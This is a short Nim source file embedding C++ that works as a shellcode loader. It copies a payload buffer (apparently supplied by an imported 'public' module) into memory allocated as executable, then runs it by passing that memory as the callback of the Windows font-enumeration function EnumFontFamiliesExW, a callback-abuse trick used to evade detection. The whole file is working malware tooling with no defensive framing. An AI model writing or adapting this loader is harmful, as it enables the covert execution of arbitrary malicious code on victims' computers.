import public

{.emit: """

int EnumFontFamiliesExWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    LOGFONTW lf = { 0 };
    lf.lfCharSet = DEFAULT_CHARSET;

    HDC dc = GetDC(NULL);
    EnumFontFamiliesExW(dc, &lf, (FONTENUMPROCW)addr, NULL, NULL);
}
"""
.}

proc EnumFontFamiliesExWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumFontFamiliesExWNim(@)",nodecl.}

discard EnumFontFamiliesExWNim(code,codelen)